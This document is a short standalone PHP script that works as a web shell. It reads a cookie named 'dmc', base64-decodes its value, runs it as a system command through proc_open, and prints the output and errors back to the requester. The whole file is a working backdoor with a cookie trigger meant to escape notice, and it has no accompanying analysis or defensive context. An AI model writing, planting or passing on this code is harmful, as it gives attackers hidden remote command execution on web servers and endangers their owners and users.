<?php
if (isset($_COOKIE['dmc'])) {
    $cmd = base64_decode($_COOKIE['dmc']);

    $descriptorspec = [
        0 => ["pipe", "r"],  // stdin
        1 => ["pipe", "w"],  // stdout
        2 => ["pipe", "w"]   // stderr
    ];

    $process = proc_open($cmd, $descriptorspec, $pipes);

    if (is_resource($process)) {
        // Capture output
        $output = stream_get_contents($pipes[1]);
        $error  = stream_get_contents($pipes[2]);

        // Close pipes
        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);

        // Close process and get exit code
        $return_value = proc_close($process);

        // Print output
        echo htmlspecialchars($output);
        if ($error) {
            echo "Error: " . htmlspecialchars($error);
        }
    }
}
?>
